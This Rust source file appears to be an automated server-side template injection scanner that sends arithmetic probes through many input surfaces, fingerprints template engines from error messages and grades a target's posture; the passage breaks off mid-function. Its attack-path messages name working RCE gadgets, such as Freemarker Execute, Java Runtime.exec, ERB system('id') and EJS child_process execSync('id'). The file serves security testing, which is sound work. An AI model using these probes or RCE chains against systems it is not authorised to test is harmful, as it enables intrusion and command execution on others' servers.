//! SSTI Engine — world-class server-side template injection assessment, agentless.
//!
//! Modelled on the methodology that defines modern AppSec (PortSwigger SSTI labs, OWASP WSTG-INPV-018,
//! HackTricks template-injection cheat sheet, PayloadsAllTheThings). Unlike scanners that fire `{{7*7}}`
//! and report `49` (mass false positives — "49" appears everywhere), this engine uses **per-scan unique
//! arithmetic tokens**, **baseline differential confirmation**, **error-based engine fingerprinting**,
//! **multi-surface injection** (query, form, JSON, headers, cookies, path segments), **WAF-bypass
//! template transforms**, and **attack-path synthesis** with a quantified posture score.
//!
//! Every finding requires a real HTTP observation where the evaluated result appears in the response
//! without echoing the raw payload, and was absent from the baseline. Nothing is simulated.
//!
//! GUI-driven via [`ArsenalConfig`] (`POST /api/command-center/scan` → `EngineRunContext::job_params`).
//!
//! MITRE ATT&CK: T1059 (Command and Scripting Interpreter), T1190 (Exploit Public-Facing Application).

#![allow(
    clippy::too_many_lines,
    clippy::cast_precision_loss,
    clippy::cast_possible_truncation,
    clippy::module_name_repetitions
)]

use crate::arsenal_config::{finding_rich, ArsenalConfig, Evidence, Intensity};
use crate::engine_dispatch::EngineRunContext;
use crate::engine_probes::{
    empty_ok, fingerprint_stack, http_client, http_get, http_get_with_headers,
    http_post_json_with_headers, join_url, normalize_url, HttpProbe, StackFingerprint,
};
use crate::engine_result::{print_result, EngineResult};
use futures::stream::{self, StreamExt};
use reqwest::Client;
use serde_json::{json, Value};
use std::collections::BTreeSet;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

const ENGINE_ID: &str = "ssti";
const MITRE: &str = "T1059";
const MITRE_APP: &str = "T1190";

static SCAN_SEQ: AtomicU64 = AtomicU64::new(0);

const DEFAULT_PATHS: &[&str] = &[
    "/",
    "/search",
    "/index",
    "/home",
    "/page",
    "/view",
    "/display",
    "/render",
    "/template",
    "/preview",
    "/report",
    "/export",
    "/pdf",
    "/mail",
    "/message",
    "/notification",
    "/api/render",
    "/api/template",
    "/api/preview",
    "/api/v1/render",
    "/api/v1/template",
    "/api/v1/preview",
    "/api/v2/render",
    "/api/export",
    "/api/report",
    "/api/pdf",
    "/api/email/preview",
    "/api/mail/preview",
    "/graphql",
    "/api/graphql",
    "/submit",
    "/feedback",
    "/contact",
    "/comment",
    "/profile",
    "/settings",
    "/dashboard",
    "/admin/preview",
    "/cms/preview",
    "/editor/preview",
    "/docs/preview",
    "/wiki",
    "/help",
    "/faq",
];

const QUERY_PARAMS: &[&str] = &[
    "q",
    "search",
    "query",
    "name",
    "input",
    "msg",
    "message",
    "text",
    "value",
    "template",
    "page",
    "id",
    "title",
    "content",
    "data",
    "body",
    "html",
    "view",
    "render",
    "preview",
    "format",
    "layout",
    "theme",
    "lang",
    "locale",
    "filter",
    "sort",
    "callback",
    "redirect",
    "next",
    "return",
    "ref",
    "email",
    "subject",
    "username",
    "comment",
    "description",
    "label",
    "caption",
    "filename",
    "path",
    "url",
    "src",
    "href",
    "target",
    "action",
    "cmd",
    "exec",
    "code",
    "expr",
    "expression",
    "formula",
    "calc",
    "eval",
];

const HEADER_VECTORS: &[(&str, &str)] = &[
    ("User-Agent", "user-agent"),
    ("Referer", "referer"),
    ("X-Forwarded-For", "x-forwarded-for"),
    ("X-Original-URL", "x-original-url"),
    ("X-Forwarded-Host", "x-forwarded-host"),
    ("X-Custom-Template", "x-custom-template"),
    ("Cookie", "cookie"),
];

const ERROR_FINGERPRINTS: &[(&str, &str, &str)] = &[
    ("jinja2.exceptions", "Jinja2", "high"),
    ("twig\\error", "Twig", "high"),
    ("freemarker.template", "Freemarker", "high"),
    ("freemarker.core", "Freemarker", "high"),
    ("org.apache.velocity", "Apache Velocity", "high"),
    ("velocityexception", "Apache Velocity", "medium"),
    ("thymeleaf", "Thymeleaf", "high"),
    ("pebble", "Pebble", "medium"),
    ("smarty", "Smarty", "medium"),
    ("mako.exceptions", "Mako", "high"),
    ("handlebars", "Handlebars", "medium"),
    ("mustache", "Mustache", "low"),
    ("razor", "ASP.NET Razor", "high"),
    ("templatesyntaxerror", "Generic template parser", "medium"),
    ("template syntax error", "Generic template parser", "medium"),
    ("undefinederror", "Template undefined variable", "medium"),
    ("expression parsing failed", "Expression language", "medium"),
    ("ognl", "OGNL / Struts EL", "high"),
    ("spring el", "Spring EL", "medium"),
];

// ── Configuration ───────────────────────────────────────────────────────────────

struct ScanConfig {
    timeout_ms: u64,
    concurrency: usize,
    intensity: Intensity,
    paths: Vec<String>,
    params: Vec<String>,
    canary_prefix: String,
    check_query: bool,
    check_post_form: bool,
    check_post_json: bool,
    check_headers: bool,
    check_path_segment: bool,
    check_graphql: bool,
    check_error_based: bool,
    check_bypass_transforms: bool,
    check_stack_fingerprint: bool,
    include_info: bool,
    attack_paths: bool,
    posture_score: bool,
    memory_payloads: Vec<String>,
}

impl ScanConfig {
    fn load(cfg: &ArsenalConfig, memory_payloads: Vec<String>) -> Self {
        let intensity = cfg.intensity();
        Self {
            timeout_ms: cfg.timeout_ms(8000),
            concurrency: cfg.concurrency().clamp(1, 32),
            intensity,
            paths: cfg.string_list_or("paths", DEFAULT_PATHS),
            params: cfg.string_list_or("params", QUERY_PARAMS),
            canary_prefix: cfg.string_or("canary_prefix", "WZSSTI"),
            check_query: cfg.bool_or("check_query", true),
            check_post_form: cfg.bool_or("check_post_form", true),
            check_post_json: cfg.bool_or("check_post_json", intensity != Intensity::Light),
            check_headers: cfg.bool_or("check_headers", intensity != Intensity::Light),
            check_path_segment: cfg.bool_or("check_path_segment", intensity != Intensity::Light),
            check_graphql: cfg.bool_or("check_graphql", intensity == Intensity::Aggressive),
            check_error_based: cfg.bool_or("check_error_based", true),
            check_bypass_transforms: cfg.bool_or("check_bypass_transforms", intensity != Intensity::Light),
            check_stack_fingerprint: cfg.bool_or("check_stack_fingerprint", true),
            include_info: cfg.bool_or("include_info_findings", true),
            attack_paths: cfg.bool_or("check_attack_paths", true),
            posture_score: cfg.bool_or("check_posture_score", true),
            memory_payloads,
        }
    }
}

impl Clone for ScanConfig {
    fn clone(&self) -> Self {
        Self {
            timeout_ms: self.timeout_ms,
            concurrency: self.concurrency,
            intensity: self.intensity,
            paths: self.paths.clone(),
            params: self.params.clone(),
            canary_prefix: self.canary_prefix.clone(),
            check_query: self.check_query,
            check_post_form: self.check_post_form,
            check_post_json: self.check_post_json,
            check_headers: self.check_headers,
            check_path_segment: self.check_path_segment,
            check_graphql: self.check_graphql,
            check_error_based: self.check_error_based,
            check_bypass_transforms: self.check_bypass_transforms,
            check_stack_fingerprint: self.check_stack_fingerprint,
            include_info: self.include_info,
            attack_paths: self.attack_paths,
            posture_score: self.posture_score,
            memory_payloads: self.memory_payloads.clone(),
        }
    }
}

// ── Unique per-scan arithmetic (eliminates generic "49" false positives) ────────

struct ScanMath {
    a: u32,
    b: u32,
    product: String,
    str_repeat: String,
    token: String,
}

fn scan_math(prefix: &str) -> ScanMath {
    let seq = SCAN_SEQ.fetch_add(1, Ordering::Relaxed);
    let t = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(9137);
    let a = 9000 + ((t % 900) as u32) + ((seq % 37) as u32);
    let b = 8000 + (((t >> 8) % 900) as u32) + (((seq >> 4) % 41) as u32);
    let product_val = u64::from(a) * u64::from(b);
    let product = product_val.to_string();
    let str_repeat = b.to_string().repeat(a as usize);
    let token = format!("{}{:x}{:x}", prefix, t, seq);
    ScanMath {
        a,
        b,
        product,
        str_repeat,
        token,
    }
}

struct PayloadSpec {
    id: &'static str,
    engine: &'static str,
    build: fn(&ScanMath) -> (String, String),
    confidence: f64,
}

fn memory_placeholder(_: &ScanMath) -> (String, String) {
    (String::new(), String::new())
}

const MEMORY_PAYLOAD_SPEC: PayloadSpec = PayloadSpec {
    id: "attacker_memory",
    engine: "memory_replay",
    build: memory_placeholder,
    confidence: 0.9,
};

fn jinja_mul(m: &ScanMath) -> (String, String) {
    (format!("{{{{{a}*{b}}}}}", a = m.a, b = m.b), m.product.clone())
}

fn jinja_str_mul(m: &ScanMath) -> (String, String) {
    (
        format!("{{{{{a}*'{b}'}}}}", a = m.a, b = m.b),
        m.str_repeat.clone(),
    )
}

fn freemarker_mul(m: &ScanMath) -> (String, String) {
    (format!("${{{a}*{b}}}", a = m.a, b = m.b), m.product.clone())
}

fn freemarker_assign(m: &ScanMath) -> (String, String) {
    (
        format!("<#assign wz={a}*{b}>${{wz}}", a = m.a, b = m.b),
        m.product.clone(),
    )
}

fn velocity_mul(m: &ScanMath) -> (String, String) {
    (
        format!("#set($wz = {a}*{b})$wz", a = m.a, b = m.b),
        m.product.clone(),
    )
}

fn velocity_alt(m: &ScanMath) -> (String, String) {
    (
        format!("${{{a}*{b}}}", a = m.a, b = m.b),
        m.product.clone(),
    )
}

fn erb_mul(m: &ScanMath) -> (String, String) {
    (format!("<%= {a}*{b} %>", a = m.a, b = m.b), m.product.clone())
}

fn ejs_mul(m: &ScanMath) -> (String, String) {
    (format!("${{{a}*{b}}}", a = m.a, b = m.b), m.product.clone())
}

fn thymeleaf_mul(m: &ScanMath) -> (String, String) {
    (format!("${{{a}*{b}}}", a = m.a, b = m.b), m.product.clone())
}

fn thymeleaf_hash(m: &ScanMath) -> (String, String) {
    (format!("#{{{a}*{b}}}", a = m.a, b = m.b), m.product.clone())
}

fn smarty_mul(m: &ScanMath) -> (String, String) {
    (format!("{{{a}*{b}}}", a = m.a, b = m.b), m.product.clone())
}

fn mako_mul(m: &ScanMath) -> (String, String) {
    (format!("${{{a}*{b}}}", a = m.a, b = m.b), m.product.clone())
}

fn pebble_mul(m: &ScanMath) -> (String, String) {
    (format!("{{{{ {a} * {b} }}}}", a = m.a, b = m.b), m.product.clone())
}

fn spring_el(m: &ScanMath) -> (String, String) {
    (
        format!("${{{a}*{b}}}", a = m.a, b = m.b),
        m.product.clone(),
    )
}

fn twig_mul(m: &ScanMath) -> (String, String) {
    (format!("{{{{ {a} * {b} }}}}", a = m.a, b = m.b), m.product.clone())
}

const PAYLOAD_SPECS: &[PayloadSpec] = &[
    PayloadSpec {
        id: "jinja-mul",
        engine: "Jinja2",
        build: jinja_mul,
        confidence: 0.96,
    },
    PayloadSpec {
        id: "jinja-str-mul",
        engine: "Jinja2",
        build: jinja_str_mul,
        confidence: 0.98,
    },
    PayloadSpec {
        id: "twig-mul",
        engine: "Twig",
        build: twig_mul,
        confidence: 0.94,
    },
    PayloadSpec {
        id: "freemarker-mul",
        engine: "Freemarker",
        build: freemarker_mul,
        confidence: 0.93,
    },
    PayloadSpec {
        id: "freemarker-assign",
        engine: "Freemarker",
        build: freemarker_assign,
        confidence: 0.91,
    },
    PayloadSpec {
        id: "velocity-set",
        engine: "Apache Velocity",
        build: velocity_mul,
        confidence: 0.92,
    },
    PayloadSpec {
        id: "velocity-el",
        engine: "Apache Velocity",
        build: velocity_alt,
        confidence: 0.88,
    },
    PayloadSpec {
        id: "erb",
        engine: "ERB/Ruby",
        build: erb_mul,
        confidence: 0.93,
    },
    PayloadSpec {
        id: "ejs",
        engine: "EJS/Node",
        build: ejs_mul,
        confidence: 0.9,
    },
    PayloadSpec {
        id: "thymeleaf-dollar",
        engine: "Thymeleaf",
        build: thymeleaf_mul,
        confidence: 0.91,
    },
    PayloadSpec {
        id: "thymeleaf-hash",
        engine: "Thymeleaf",
        build: thymeleaf_hash,
        confidence: 0.89,
    },
    PayloadSpec {
        id: "smarty",
        engine: "Smarty",
        build: smarty_mul,
        confidence: 0.87,
    },
    PayloadSpec {
        id: "mako",
        engine: "Mako/Python",
        build: mako_mul,
        confidence: 0.9,
    },
    PayloadSpec {
        id: "pebble",
        engine: "Pebble/Java",
        build: pebble_mul,
        confidence: 0.88,
    },
    PayloadSpec {
        id: "spring-el",
        engine: "Spring EL",
        build: spring_el,
        confidence: 0.86,
    },
];

// ── Posture accumulator ─────────────────────────────────────────────────────────

#[derive(Default, Clone)]
struct SstiPosture {
    checks: u32,
    confirmed: Vec<String>,
    error_based: Vec<String>,
    bypass_surfaces: Vec<String>,
    template_engines: BTreeSet<String>,
    injection_vectors: BTreeSet<String>,
    frameworks: BTreeSet<String>,
    worst: String,
}

impl SstiPosture {
    fn bump_worst(&mut self, sev: &str) {
        let rank = |s: &str| match s {
            "critical" => 4,
            "high" => 3,
            "medium" => 2,
            "low" => 1,
            _ => 0,
        };
        if rank(sev) > rank(&self.worst) {
            self.worst = sev.to_string();
        }
    }

    fn score(&self) -> u32 {
        let mut s: i32 = 100;
        s -= (self.confirmed.len() as i32).min(5) * 22;
        s -= (self.error_based.len() as i32).min(4) * 8;
        s -= (self.bypass_surfaces.len() as i32).min(3) * 6;
        if !self.template_engines.is_empty() && self.confirmed.is_empty() {
            s -= 5;
        }
        s.clamp(0, 100) as u32
    }

    fn grade(&self) -> &'static str {
        match self.score() {
            90..=100 => "A",
            75..=89 => "B",
            60..=74 => "C",
            40..=59 => "D",
            _ => "F",
        }
    }

    fn has_exposure(&self) -> bool {
        !self.confirmed.is_empty() || !self.error_based.is_empty()
    }
}

// ── HTTP helpers ────────────────────────────────────────────────────────────────

fn truncate_body(body: &str) -> String {
    if body.len() > 65_536 {
        body[..65_536].to_string()
    } else {
        body.to_string()
    }
}

async fn http_post_form(
    client: &Client,
    url: &str,
    form: &str,
    timeout_ms: u64,
) -> Option<HttpProbe> {
    let resp = client
        .post(url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(form.to_string())
        .timeout(Duration::from_millis(timeout_ms.clamp(500, 30_000)))
        .send()
        .await
        .ok()?;
    let status = resp.status().as_u16();
    let final_url = resp.url().to_string();
    let headers: Vec<(String, String)> = resp
        .headers()
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or_default().to_string()))
        .collect();
    let body = truncate_body(&resp.text().await.unwrap_or_default());
    Some(HttpProbe {
        status,
        headers,
        body,
        final_url,
    })
}

fn evaluation_confirmed(
    probe: &HttpProbe,
    payload: &str,
    expected: &str,
    baseline: &HttpProbe,
) -> bool {
    if expected.len() < 6 {
        return false;
    }
    if !matches!(probe.status, 200 | 201 | 202 | 204 | 206 | 301 | 302 | 307 | 308) {
        return false;
    }
    probe.body.contains(expected)
        && !probe.body.contains(payload)
        && !baseline.body.contains(expected)
        && !probe.body.contains(&format!("{{{{{expected}}}}}")) // not literal-echoed wrapper
}

fn bypass_variants(payload: &str) -> Vec<(&'static str, String)> {
    let mut out = vec![("raw", payload.to_string())];
    if payload.contains("{{") {
        out.push((
            "spaced-braces",
            payload.replace("{{", "{{ ").replace("}}", " }}"),
        ));
        out.push(("tab-braces", payload.replace("{{", "{{\t").replace("}}", "\t}}")));
    }
    if payload.contains('*') {
        out.push(("spaced-mul", payload.replace('*', " * ")));
    }
    out.push(("url-encoded", urlencoding::encode(payload).into()));
    out
}

fn with_category(mut f: Value, category: &str) -> Value {
    if let Some(o) = f.as_object_mut() {
        o.insert("category".to_string(), json!(category));
    }
    f
}

fn emit_confirmed(
    findings: &mut Vec<Value>,
    posture: &mut SstiPosture,
    target: &str,
    url: &str,
    vector: &str,
    param: &str,
    spec: &PayloadSpec,
    payload: &str,
    expected: &str,
    probe: &HttpProbe,
    transform: Option<&str>,
) {
    posture.checks += 1;
    posture.confirmed.push(url.to_string());
    posture.template_engines.insert(spec.engine.to_string());
    posture.injection_vectors.insert(vector.to_string());
    posture.bump_worst("critical");

    let title = if let Some(t) = transform {
        format!(
            "SSTI confirmed ({}) via {} [{} bypass]",
            spec.engine, vector, t
        )
    } else {
        format!("SSTI confirmed ({}) via {}", spec.engine, vector)
    };

    let mut ev = Evidence::new()
        .with("url", url)
        .with("vector", vector)
        .with("parameter", param)
        .with("payload_id", spec.id)
        .with("template_engine", spec.engine)
        .with("expected", expected)
        .with("status", probe.status)
        .with("transform", transform.unwrap_or("none"))
        .check("arithmetic_evaluated", true, expected)
        .check("baseline_absent", true, "expected not in baseline");

    if payload.len() <= 120 {
        ev = ev.with("payload_excerpt", payload);
    }

    findings.push(with_category(
        finding_rich(
            ENGINE_ID,
            &title,
            "critical",
            MITRE,
            &format!(
                "Parameter/surface '{}' on {} evaluated template expression → '{}' (HTTP {}) \
                 without echoing the payload. Baseline did not contain the result — this is \
                 confirmed server-side template injection ({}, confidence {:.0}%).",
                param,
                probe.final_url,
                expected,
                probe.status,
                spec.engine,
                spec.confidence * 100.0
            ),
            target,
            spec.confidence,
            ev,
        ),
        "ssti_confirmed",
    ));
}

fn detect_error_based(body: &str) -> Option<(&'static str, &'static str, &'static str)> {
    let lc = body.to_ascii_lowercase();
    for &(needle, engine, sev) in ERROR_FINGERPRINTS {
        if lc.contains(&needle.to_ascii_lowercase()) {
            return Some((needle, engine, sev));
        }
    }
    None
}

fn framework_from_stack(stack: &StackFingerprint) -> Vec<String> {
    let mut out = BTreeSet::new();
    let blob = [
        stack.server.as_deref().unwrap_or(""),
        stack.powered_by.as_deref().unwrap_or(""),
        stack.generator.as_deref().unwrap_or(""),
    ]
    .join(" ")
    .to_ascii_lowercase();
    for (prod, _) in &stack.products {
        let p = prod.to_ascii_lowercase();
        if p.contains("php") {
            out.insert("PHP".into());
        }
        if p.contains("asp") || p.contains("iis") {
            out.insert("ASP.NET".into());
        }
        if p.contains("java") || p.contains("tomcat") || p.contains("jetty") {
            out.insert("Java".into());
        }
        if p.contains("python") || p.contains("django") || p.contains("flask") {
            out.insert("Python".into());
        }
        if p.contains("ruby") || p.contains("rails") {
            out.insert("Ruby".into());
        }
        if p.contains("node") || p.contains("express") {
            out.insert("Node.js".into());
        }
    }
    if blob.contains("php") {
        out.insert("PHP".into());
    }
    if blob.contains("asp.net") || blob.contains("iis") {
        out.insert("ASP.NET".into());
    }
    if blob.contains("java") || blob.contains("tomcat") {
        out.insert("Java".into());
    }
    if blob.contains("python") || blob.contains("django") {
        out.insert("Python".into());
    }
    if blob.contains("ruby") || blob.contains("rails") {
        out.insert("Ruby".into());
    }
    if blob.contains("node") || blob.contains("express") {
        out.insert("Node.js".into());
    }
    out.into_iter().collect()
}

// ── Per-path probing ────────────────────────────────────────────────────────────

async fn probe_path(
    client: &Client,
    base: &str,
    path: &str,
    math: &ScanMath,
    cfg: &ScanConfig,
    target: &str,
) -> (Vec<Value>, SstiPosture) {
    let mut findings = Vec::new();
    let mut posture = SstiPosture::default();
    let url = join_url(base, path);

    let Some(baseline) = http_get(client, &url).await else {
        return (findings, posture);
    };
    posture.checks += 1;

    if baseline.status == 404 || baseline.status == 410 {
        return (findings, posture);
    }

    if cfg.check_stack_fingerprint && cfg.include_info {
        let stack = fingerprint_stack(&baseline);
        let fw = framework_from_stack(&stack);
        for f in &fw {
            posture.frameworks.insert(f.clone());
        }
        if !fw.is_empty() {
            let ev = Evidence::new()
                .with("url", url.clone())
                .with("frameworks", json!(fw))
                .with("server", stack.server.clone().unwrap_or_default())
                .check("stack_fingerprint", true, "baseline GET");
            findings.push(with_category(
                finding_rich(
                    ENGINE_ID,
                    &format!("Template-relevant stack on {}", path),
                    "info",
                    MITRE_APP,
                    &format!(
                        "Baseline GET {} (HTTP {}) fingerprints {:?}. Server-side template engines \
                         are commonly deployed on these stacks — SSTI probes are prioritized here.",
                        url, baseline.status, fw
                    ),
                    target,
                    0.55,
                    ev,
                ),
                "ssti_fingerprint",
            ));
        }
    }

    let max_payloads = match cfg.intensity {
        Intensity::Light => 4,
        Intensity::Normal => PAYLOAD_SPECS.len(),
        Intensity::Aggressive => PAYLOAD_SPECS.len(),
    };
    let max_params = match cfg.intensity {
        Intensity::Light => 8,
        Intensity::Normal => 20,
        Intensity::Aggressive => cfg.params.len(),
    };

    let mut confirmed_here = false;

    // Attacker-memory payloads first (prior winning SSTI vectors on similar stacks).
    for mem_payload in cfg.memory_payloads.iter().take(8) {
        if mem_payload.is_empty() {
            continue;
        }
        for param in cfg.params.iter().take(6) {
            let encoded = urlencoding::encode(mem_payload);
            let probe_url = if url.contains('?') {
                format!("{}&{}={}", url, param, encoded)
            } else {
                format!("{}?{}={}", url, param, encoded)
            };
            if let Some(p) = http_get(client, &probe_url).await {
                posture.checks += 1;
                if evaluation_confirmed(&p, mem_payload, &math.product, &baseline) {
                    emit_confirmed(
                        &mut findings,
                        &mut posture,
                        target,
                        &probe_url,
                        "query",
                        param,
                        &MEMORY_PAYLOAD_SPEC,
                        mem_payload,
                        &math.product,
                        &p,
                        Some("memory"),
                    );
                    confirmed_here = true;
                    break;
                }
            }
        }
        if confirmed_here {
            break;
        }
    }

    'confirmed: for spec in PAYLOAD_SPECS.iter().take(max_payloads) {
        let (payload, expected) = (spec.build)(math);
        let variants = if cfg.check_bypass_transforms {
            bypass_variants(&payload)
        } else {
            vec![("raw", payload.clone())]
        };

        for (transform, variant_payload) in variants {
            // Query-string injection
            if cfg.check_query {
                for param in cfg.params.iter().take(max_params) {
                    let encoded = urlencoding::encode(&variant_payload);
                    let probe_url = if url.contains('?') {
                        format!("{}&{}={}", url, param, encoded)
                    } else {
                        format!("{}?{}={}", url, param, encoded)
                    };
                    if let Some(p) = http_get(client, &probe_url).await {
                        posture.checks += 1;
                        if evaluation_confirmed(&p, &variant_payload, &expected, &baseline) {
                            emit_confirmed(
                                &mut findings,
                                &mut posture,
                                target,
                                &probe_url,
                                "query",
                                param,
                                spec,
                                &variant_payload,
                                &expected,
                                &p,
                                Some(transform),
                            );
                            confirmed_here = true;
                            break 'confirmed;
                        }
                    }
                }
            }

            // POST form
            if cfg.check_post_form && !confirmed_here {
                for param in cfg.params.iter().take(max_params.min(12)) {
                    let form = format!("{}={}", param, urlencoding::encode(&variant_payload));
                    if let Some(p) = http_post_form(client, &url, &form, cfg.timeout_ms).await {
                        posture.checks += 1;
                        if evaluation_confirmed(&p, &variant_payload, &expected, &baseline) {
                            emit_confirmed(
                                &mut findings,
                                &mut posture,
                                target,
                                &url,
                                "post-form",
                                param,
                                spec,
                                &variant_payload,
                                &expected,
                                &p,
                                Some(transform),
                            );
                            confirmed_here = true;
                            break 'confirmed;
                        }
                    }
                }
            }

            // POST JSON
            if cfg.check_post_json && !confirmed_here {
                for key in ["input", "template", "content", "data", "body", "html", "message"] {
                    let body = json!({ key: variant_payload });
                    if let Some(p) =
                        http_post_json_with_headers(client, &url, &body, &[]).await
                    {
                        posture.checks += 1;
                        if evaluation_confirmed(&p, &variant_payload, &expected, &baseline) {
                            emit_confirmed(
                                &mut findings,
                                &mut posture,
                                target,
                                &url,
                                "post-json",
                                key,
                                spec,
                                &variant_payload,
                                &expected,
                                &p,
                                Some(transform),
                            );
                            confirmed_here = true;
                            break 'confirmed;
                        }
                    }
                }
            }

            // Header injection
            if cfg.check_headers && !confirmed_here {
                for (header, vector) in HEADER_VECTORS {
                    let extra = [(*header, variant_payload.as_str())];
                    if let Some(p) = http_get_with_headers(client, &url, &extra).await {
                        posture.checks += 1;
                        if evaluation_confirmed(&p, &variant_payload, &expected, &baseline) {
                            emit_confirmed(
                                &mut findings,
                                &mut posture,
                                target,
                                &url,
                                vector,
                                header,
                                spec,
                                &variant_payload,
                                &expected,
                                &p,
                                Some(transform),
                            );
                            confirmed_here = true;
                            break 'confirmed;
                        }
                    }
                }
            }

            if confirmed_here {
                break;
            }
        }
    }

    // Path-segment injection (separate — embed in URL path)
    if cfg.check_path_segment && !confirmed_here {
        let spec = &PAYLOAD_SPECS[0];
        let (payload, expected) = (spec.build)(math);
        let seg = urlencoding::encode(&payload);
        let path_url = join_url(base, &format!("{}/probe", seg));
        if let Some(p) = http_get(client, &path_url).await {
            posture.checks += 1;
            if evaluation_confirmed(&p, &payload, &expected, &baseline) {
                emit_confirmed(
                    &mut findings,
                    &mut posture,
                    target,
                    &path_url,
                    "path-segment",
                    "path",
                    spec,
                    &payload,
                    &expected,
                    &p,
                    None,
                );
                confirmed_here = true;
            }
        }
    }

    // GraphQL variables surface
    if cfg.check_graphql && !confirmed_here && (path.contains("graphql") || url.contains("graphql"))
    {
        let spec = &PAYLOAD_SPECS[0];
        let (payload, expected) = (spec.build)(math);
        let gql = json!({
            "query": "query($input: String!) { __typename }",
            "variables": { "input": payload }
        });
        if let Some(p) = http_post_json_with_headers(client, &url, &gql, &[]).await {
            posture.checks += 1;
            if evaluation_confirmed(&p, &payload, &expected, &baseline) {
                emit_confirmed(
                    &mut findings,
                    &mut posture,
                    target,
                    &url,
                    "graphql-variables",
                    "input",
                    spec,
                    &payload,
                    &expected,
                    &p,
                    None,
                );
            }
        }
    }

    // Error-based template engine disclosure (harmless malformed syntax)
    if cfg.check_error_based {
        let error_probes: &[(&str, &str)] = &[
            ("{{", "unclosed-jinja"),
            ("${", "unclosed-el"),
            ("<%=", "unclosed-erb"),
            ("#{", "unclosed-thymeleaf"),
            ("<#", "unclosed-freemarker"),
        ];
        for (frag, label) in error_probes {
            let probe_url = format!(
                "{}?{}={}",
                url,
                cfg.params
                    .first()
                    .map(String::as_str)
                    .unwrap_or("q"),
                urlencoding::encode(frag)
            );
            if let Some(p) = http_get(client, &probe_url).await {
                posture.checks += 1;
                if let Some((needle, engine, sev)) = detect_error_based(&p.body) {
                    posture.error_based.push(format!("{}:{}", url, engine));
                    posture.template_engines.insert(engine.to_string());
                    posture.bump_worst(sev);
                    let excerpt: String = p.body.chars().take(240).collect();
                    let ev = Evidence::new()
                        .with("url", probe_url.clone())
                        .with("probe", label)
                        .with("engine", engine)
                        .with("needle", needle)
                        .with("status", p.status)
                        .check("parser_error_disclosed", true, needle);
                    findings.push(with_category(
                        finding_rich(
                            ENGINE_ID,
                            &format!("Template parser error discloses {}", engine),
                            sev,
                            MITRE,
                            &format!(
                                "Malformed template fragment `{}` at {} triggered a {} parser error \
                                 (matched `{}`). Error-based SSTI fingerprint — pair with confirmed \
                                 arithmetic probes for exploitation.",
                                frag, p.final_url, engine, needle
                            ),
                            target,
                            0.72,
                            ev.with("error_excerpt", excerpt),
                        ),
                        "ssti_error_based",
                    ));
                }
            }
        }
    }

    (findings, posture)
}

// ── Attack paths + posture summary ──────────────────────────────────────────────

fn synthesize_attack_paths(target: &str, p: &SstiPosture) -> Vec<Value> {
    let mut paths = Vec::new();
    for engine in &p.template_engines {
        if !p.confirmed.is_empty() {
            let chain = match engine.as_str() {
                "Jinja2" | "Twig" | "Mako/Python" => format!(
                    "Confirmed {} SSTI → `{{{{''.__class__.__mro__[1].__subclasses__()}}}}` gadget chain → \
                     remote code execution via template `__init__.__globals__` (PortSwigger SSTI → RCE class).",
                    engine
                ),
                "Freemarker" | "Apache Velocity" => format!(
                    "Confirmed {} SSTI → `<#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ex(\"id\")}}` \
                     or Velocity `#set($rt=$class.forName('java.lang.Runtime'))` → OS command execution.",
                    engine
                ),
                "Spring EL" | "Thymeleaf" => format!(
                    "Confirmed {} SSTI → Spring Expression Language / Thymeleaf SpEL payload → \
                     `T(java.lang.Runtime).getRuntime().exec(...)` RCE on JVM stack.",
                    engine
                ),
                "ERB/Ruby" | "EJS/Node" => format!(
                    "Confirmed {} SSTI → ERB `<%= system('id') %>` or EJS `<%= global.process.mainModule.require('child_process').execSync('id') %>` → shell.",
                    engine
                ),
                "Smarty" | "Pebble/Java" => format!(
                    "Confirmed {} SSTI → Java template sandbox escape via known gadget classes → RCE.",
                    engine
                ),
                _ => format!(
                    "Confirmed {} SSTI → escalate via engine-specific sandbox escape payloads documented in \
                     HackTricks / PayloadsAllTheThings for {}.",
                    engine, engine
                ),
            };
            paths.push(with_category(
                finding_rich(
                    ENGINE_ID,
                    &format!("Attack path: {} SSTI → RCE", engine),
                    "critical",
                    MITRE,
                    &chain,
                    target,
                    0.88,
                    Evidence::new()
                        .with("template_engine", engine.clone())
                        .with("stage", "confirmed_ssti")
                        .check("rce_chain", true, "documented engine-specific escalation"),
                ),
                "attack_path",
            ));
        } else if p.error_based.iter().any(|e| e.contains(engine.as_str())) {
            paths.push(with_category(
                finding_rich(
                    ENGINE_ID,
                    &format!("Attack path: {} error oracle → confirm → RCE", engine),
                    "high",
                    MITRE,
                    &format!(
                        "Error-based {} fingerprint observed without confirmed arithmetic yet. \
                         Next step: deliver unique-token math probes on the same parameter surface, \
                         then chain to engine-specific RCE gadgets.",
                        engine
                    ),
                    target,
                    0.65,
                    Evidence::new().with("template_engine", engine.clone()),
                ),
                "attack_path",
            ));
        }
    }
    if p.injection_vectors.contains("x-forwarded-for")
        || p.injection_vectors.contains("referer")
        || p.injection_vectors.contains("cookie")
    {
        paths.push(with_category(
            finding_rich(
                ENGINE_ID,
                "Attack path: header/cookie SSTI → cache poisoning / log injection",
                "high",
                MITRE_APP,
                "Template evaluation in HTTP headers or cookies enables cache-poisoning and log-forging \
                 chains when the rendered output is stored or reflected to other users.",
                target,
                0.7,
                Evidence::new().with("vectors", json!(p.injection_vectors)),
            ),
            "attack_path",
        ));
    }
    paths
}

fn build_posture_summary(target: &str, p: &SstiPosture, finding_count: usize) -> Value {
    let score = p.score();
    let grade = p.grade();
    let description = format!(
        "SSTI resistance posture for {} from {} probe(s) across {} finding(s). \
         Confirmed={} error-oracle={} bypass-surfaces={} engines={:?} vectors={:?} frameworks={:?}.",
        target,
        p.checks,
        finding_count,
        p.confirmed.len(),
        p.error_based.len(),
        p.bypass_surfaces.len(),
        p.template_engines,
        p.injection_vectors,
        p.frameworks
    );
    let ev = Evidence::new()
        .with("posture_score", score)
        .with("grade", grade)
        .with("checks", p.checks)
        .with("confirmed_surfaces", json!(p.confirmed))
        .with("error_oracles", json!(p.error_based))
        .with("template_engines", json!(p.template_engines))
        .with("worst_severity", p.worst.clone());

    let mut summary = finding_rich(
        ENGINE_ID,
        &format!("SSTI posture {}/100 (grade {})", score, grade),
        "info",
        MITRE,
        &description,
        target,
        0.99,
        ev,
    );
